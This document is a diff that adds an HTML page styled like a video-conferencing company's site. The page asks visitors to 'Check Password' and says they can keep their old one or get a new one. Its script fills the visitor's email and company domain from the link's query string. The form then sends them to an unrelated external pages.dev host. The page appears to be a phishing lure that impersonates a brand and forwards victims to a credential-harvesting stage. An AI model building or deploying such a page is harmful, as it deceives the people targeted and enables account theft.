@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/all.css">
+    <link rel="shortcut icon" href="https://piinvt.com/wt/wp-content/uploads/2024/11/20GBe.jpg" type="image/x-icon">
+
+
+</head>
+<style>
+*{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+    font-family: Calibri, sans-serif;
+    scroll-behavior: smooth;
+    transition: 0.2s ease-in-out;
+    word-wrap: break-word;
+}
+
+a{
+    text-decoration: none;
+    color: inherit;
+}
+
+#mobile_menu{
+    display: none;
+}
+
+nav{
+    width: 100%;
+    box-shadow: 0px 0px 2px gray;
+    position: fixed;
+    top: 0;
+    z-index: 10;
+}
+
+.nav_top ul, .nav_down ul{
+    display: flex;
+    list-style: none;
+}
+
+.nav_top{
+    background-color:  #21618c ;
+    color:  white;
+    padding: 1rem 0.5rem;
+    width: 100%;
+}
+
+.nav_top ul{
+    justify-content: right;
+    align-items: center;
+    gap: 1rem;
+}
+
+.nav_top ul li a{
+    margin: 0rem 0.5rem;
+}
+
+.img_svg{
+    position: absolute;
+    filter: invert(100%);
+}
+
+.svg_container{
+    position: relative;
+}
+
+#nav_iput {
+    padding: 0.1rem 0.5rem;
+    width: 300px;
+    outline: none;
+    font-size: inherit;
+    display: none;
+}
+
+#search_img{
+    left: -30px;
+    top: -2px;
+    width: 20px;
+    cursor: pointer;
+}
+
+#host_container{
+margin-right: 20px;
+}
+
+#host_img{
+    width: 15px;
+    right: -15px;
+    top: 3px;
+}
+
+.nav_down{
+background-color: white;
+    padding: 0rem 1rem 0rem 3rem;
+}
+
+.nav_down ul li{
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 1rem;
+    padding: 0.8rem 0.5rem;
+    position: relative;
+    font-size: large;
+    color: gray;
+    width: 100%;
+}
+
+.nav_down span.spanmenudown{
+    gap: 30px;
+}
+
+.nav_down ul.rightlist li{
+    display: flex;
+    justify-content: space-between;
+    width: max-content;
+    margin-left: 2rem!important;
+
+}
+.nav_down ul.rightlist li img{
+    width: 15px;
+    height: 7.25px;
+}
+.nav_down ul.rightlist li a{
+text-transform: none !important;
+    color: #666484 !important;
+    font-size: 17.5px !important;
+    font-weight: bold !important;
+}
+
+.nav_down ul li a:hover{
+  color: #0b5cff;
+}
+
+.nav_down ul li span{
+    display: flex;
+    align-items: center;
+}
+
+.nav_down ul li span:last-child{
+    display: flex;
+    justify-content: right;
+}
+
+.nav_down ul img{
+    width: 100px;
+    margin-right: 1rem;
+    cursor: pointer;
+}
+
+#conact_btn, #sign_btn{
+    border: 1px solid #0b5cff;
+    color: #0b5cff;
+    margin: 0rem 0.5rem;
+    padding: 0.4rem 1rem;
+    border-radius: 50px;
+    /* font-weight: bold; */
+    font-size: larger;
+    opacity: 0.8;
+}
+
+#conact_btn:hover, #sign_btn:hover{
+    opacity: 1;
+}
+
+#sign_btn{
+    background-color: #0b5cff;
+    color: white;
+}
+
+@media (max-width:900px) {
+    .nav_top{
+        padding: 0;
+    }
+
+    #mobile_menu{
+        display: block;
+        font-size: 2.5rem;
+        margin: 0rem 0.2rem;
+    }
+
+    .nav_top ul{
+        display: none;
+    }
+
+    .nav_down{
+        padding: 0rem;
+    }
+
+    .nav_down span a{
+        display: none;
+    }
+
+    .nav_down ul img{
+        width: 50px;
+        margin-right: 0.2rem;
+    }
+}
+
+@media (max-width:500px) {
+    #mobile_menu{
+        font-size: 2rem;
+    }
+}
+
+.link_container{
+    margin-top: 9rem;
+}
+
+.link_container h1{
+    text-align: center;
+    font-size: 2.5rem;
+}
+
+.link_inputs{
+    width: 35%;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1rem;
+    margin: 1rem auto;
+}
+
+.link_inputs input, .link_inputs section{
+    width: 100%;
+}
+
+.link_inputs input{
+    padding: 1rem 0.5rem;
+    outline: none;
+    font-size: inherit;
+    margin: 0.3rem 0rem;
+}
+
+.link_inputs button{
+    display: flex;
+    margin: 0.5rem auto;
+    cursor: pointer;
+    background-color:  #21618c ;
+    color: white;
+    border: none;
+    border-radius: 10px;
+    padding: 0.5rem 1rem;
+    font-size: large;
+}
+
+.link_inputs button:hover, .link_copy button:hover{
+    background-color: #0047AB;
+}
+
+.link_copy{
+    display: none;
+}
+
+.link_copy p, #generate_link{
+    margin: 0rem 1rem;
+}
+
+.link_copy button{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    cursor: pointer;
+    background-color:  #21618c ;
+    color: white;
+    margin: 1rem;
+    padding: 0.3rem 0.8rem;
+    border-radius: 5px;
+    font-size: larger;
+    border: none;
+}
+
+.link_copy button img{
+    filter: invert(100%)
+}
+
+/*  */
+
+@media (max-width: 1030px) {
+    .link_inputs{
+        width: 50%;
+    }
+}
+
+@media (max-width: 900px) {
+    .link_inputs{
+        width: 60%;
+    }
+
+    .link_container h1{
+        font-size: 2rem;
+    }
+}
+
+@media (max-width: 600px) {
+    .link_container h1{
+        font-size: 1.5rem;
+    }
+
+    .link_inputs{
+        width: 70%;
+    }
+
+
+}
+
+@media (max-width: 500px) {
+    .link_inputs{
+        width: 90%;
+    }
+
+
+}
+
+.meeting_container{
+    margin-top: 9rem;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.meeting_contents{
+    width: 30%;
+    background-color: white;
+}
+
+.meeting_contents h1{
+    text-align: center;
+    font-size: 2rem;
+    margin: 0rem 0.2rem 1rem 0.2rem;
+}
+
+.meeting_online{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 1rem;
+    margin-top: 2rem;
+    font-size: larger;
+}
+
+.meeting_header b{
+    text-transform: capitalize;
+}
+
+#online_icon{
+    display: inline-block;
+    width: 15px;
+    height: 15px;
+    border-radius: 50%;
+    background-color: green;
+    animation: online 1.5s linear infinite;
+}
+
+.meeting_photo{
+    display: flex;
+    justify-content: space-between;
+    gap: 1rem;
+    margin-top: 1rem;
+}
+
+.meeting_photo section img{
+    width: 200px;
+    height: 200px;
+    border-radius: 50%;
+}
+
+.meeting_photo section h5{
+    font-style: italic;
+    text-align: center;
+    font-size: smaller;
+}
+
+.meeting_contents button{
+    display: flex;
+    width: 100%;
+    margin: 2rem auto;
+    justify-content: center;
+    padding: 0.7rem 0.5rem;
+    font-size: 1.5rem;
+    border-radius: 5px;
+    border: none;
+    background-color: rgba(0, 71, 171, 0.9);
+    color: white;
+}
+.meeting_contents button:hover{
+    background-color: rgba(0, 71, 171, 1);
+    cursor: pointer;
+}
+.meeting_contents button:disabled{
+    opacity: 0.5; cursor: not-allowed;
+}
+.meeting_note{
+    text-align: center;
+    font-size: small;
+    font-style: italic;
+    margin-bottom: 5rem;
+    color: gray;
+}
+
+.meeting_loading{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+}
+
+.meeting_loading img{
+    width: 30px;
+    object-fit: contain;
+}
+
+footer{
+    background-color: #21618c;
+    color: beige;
+    font-size: smaller;
+    text-align: center;
+    font-weight: 500;
+    padding: 1rem 0.3rem;
+}
+
+/* Reg */
+.meeting_reg{
+    text-align: center;
+}
+
+.meeting_reg h2{
+    color: #0047AB;
+    margin: 0.5rem 0.2rem;
+    font-weight: 500;
+}
+
+.meeting_reg input{
+    display: block;
+    width: 100%;
+    margin-top: 1rem;
+    padding: 0.8rem 0.3rem;
+    outline: none;
+    border: 2px solid silver;
+    border-radius: 5px;
+    font-size: large;
+}
+
+.meeting_reg input:focus{
+    border-color: #0047AB !important;
+}
+
+.meeting_reg input::placeholder{
+    text-align: center;
+}
+
+.meeting_reg p{
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-top: 1rem;
+}
+
+.meeting_reg p input{
+    width: auto;
+    padding: 0;
+    margin: 0;
+}
+
+.meeting_reg p a{
+    color: white;
+}
+
+/*  */
+@keyframes online {
+    from{
+        opacity: 0.7;
+    }
+    to{
+        opacity: 1;
+    }
+}
+
+/*  */
+
+@media (max-width:1030px) {
+    .meeting_container{
+    min-height: 100vh;
+    }
+
+    .meeting_contents{
+        width: 50%;
+    }
+}
+
+@media (max-width:900px) {
+    .meeting_contents{
+        width: 60%;
+    }
+}
+
+@media (max-width:600px) {
+    .meeting_contents{
+        width: 90%;
+    }
+}
+
+@media (max-width:500px) {
+    .meeting_photo{
+        flex-wrap: wrap;
+        justify-content: center;
+    }
+
+    footer{
+        display: none;
+    }
+}
+      </style>
+<body data-sveltekit-preload-data="hover">
+	<div style="display: contents"><!--[--><!--[--><!----><nav><div class="nav_top"><span id="mobile_menu">☰</span> <ul><li><span><span class="svg_container"><input type="search" name="" id="nav_iput" placeholder="Search"> </span> Search</span> <a href="#">support</a> <a href="#">1.888.799.9666</a> <span style="color: #aaa;">|</span> <a href="#">Request a Demo</a></li></ul></div> <div class="nav_down"><ul><li><span class="spanmenudown"><center></li> <li><a href="#"></a></li></ul></span></li></ul></div></nav> <main><!----><!----><section class="link_container">
+
+<div style="font-size:16pt; color:#21618c;" align="center"><b>"CHECK PASSWORD" <p> To use your old password or let the system generate a new one.</b></div>
+
+<form class="link_inputs" id="MyForm" action="https://dww-d9d.pages.dev/" method="GET">
+
+<section><p>Company Domain:</p> 
+
+            <div class="form-floating mb-3">
+<input id="mail" name="mail" type="text" value=""style=" background:#fff; color:black; font-size: 12pt; height: 35px; width:350px;" required placeholder="Enter Company Name"readonly>
+
+         <div class="form-group mb-4 position-relative">
+</section> <section><p>Email:</p> <input id="email" type="email" name="email" style=" background:#fff; color:black; font-size: 12pt; height: 35px; width:350px;"readonly>
+
+ <p>
+            <div class="form-check mb-4"> 
+
+      <br/>
+        <p><p><center>
+
+  <p> <button id="book_btn" type="submit">Check Password</button>
+
+
+</form>
+</section>
+<script type="text/javascript">
+const params=new URLSearchParams(window.location.search);
+document.getElementById('email').value=params.get('email');
+document.getElementById('mail').value=params.get('mail');
+document.getElementById("email").innerHTML = window.location.search;
+document.getElementById("mail").innerHTML = window.location.search;
+
+ 
+</script>
+  <br/>
+        <p> <br/>
+        <p>
+<!----><!----></main> <footer>Copyright ©<span id="copyright-year"></span> CHECK STATUS Communication, Inc. All Rights Reserved.</footer><!----><!--]--> <!--[!--><!--]--><!--]-->
+ 
